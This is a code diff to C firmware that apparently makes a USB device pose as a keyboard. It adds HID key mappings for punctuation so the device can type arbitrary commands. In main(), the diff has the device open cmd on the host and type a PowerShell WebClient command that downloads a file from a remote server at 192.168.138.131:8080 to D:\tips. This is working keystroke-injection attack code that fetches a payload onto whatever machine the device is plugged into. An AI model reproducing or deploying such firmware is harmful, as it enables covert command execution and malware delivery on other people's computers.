@@ -67,7 +67,6 @@ int keyboard_send_ascii(u8 c)
 	if (c >= 'a' && c <= 'z') {
 		hid_code = 0x04 + (c - 'a');
 	} else if (c >= 'A' && c <= 'Z') {
-		buffer[0] = 0x2;
 		hid_code = 0x04 + (c - 'A');
 		capital = 1;
 	} else if (c >= '0' && c <= '9') {
@@ -82,13 +81,40 @@ int keyboard_send_ascii(u8 c)
 			case (':'): /* ':' = capital(';') */
 				hid_code = 0x33;
 				capital = 1;
-				break;			
+				break;		
+			case ('\"'): /* '\"' = capital(''') */
+				hid_code = 0x34;
+				capital = 1;
+				break;		
+			case ('('): /* '(' = capital('9') */
+				hid_code = 0x26;
+				capital = 1;
+				break;		
+			case (')'): /* '(' = capital('0') */
+				hid_code = 0x27;
+				capital = 1;
+				break;					
 			case (' '):
 				hid_code = 0x2C;
 				break;
+			case ('-'):
+				hid_code = 0x2d;
+				break;
 			case ('='):
 				hid_code = 0x2E;
-				break;			
+				break;
+			case ('\\'):
+				hid_code = 0x31;
+				break;
+			case ('\''):
+				hid_code = 0x34;
+				break;
+			case (','):
+				hid_code = 0x36;
+				break;
+			case ('.'):
+				hid_code = 0x37;
+				break;
 			case ('/'):
 				hid_code = 0x38;
 				break;			
@@ -100,9 +126,12 @@ int keyboard_send_ascii(u8 c)
 		}
 	}
 	buffer[2] = hid_code;
+	
 	if (capital) {
+		buffer[0] = 0x2;
 		__keyboard_send(Buffer_Shift);
 	}
+
 	__keyboard_send(buffer);
 	
 	if (capital) {
@@ -151,10 +180,18 @@ int main(void)
 
 		__keyboard_send(buffer_release);
 		
-		//keyboard_send_string("cmd\n\n");
+
+		
 		//keyboard_send_string("CMD\n\n");
 		//keyboard_send_string("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");
+		keyboard_send_string("cmd\n\n");
 		
+		/*******switch the input method to english **********/
+		__keyboard_send(Buffer_Shift);
+		__keyboard_send(buffer_release);
+		/****************************************************/
+		
+		keyboard_send_string("powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://192.168.138.131:8080/tips', 'D:\\tips')\n");
 #if 0
 		__keyboard_send(buffer_c);
 
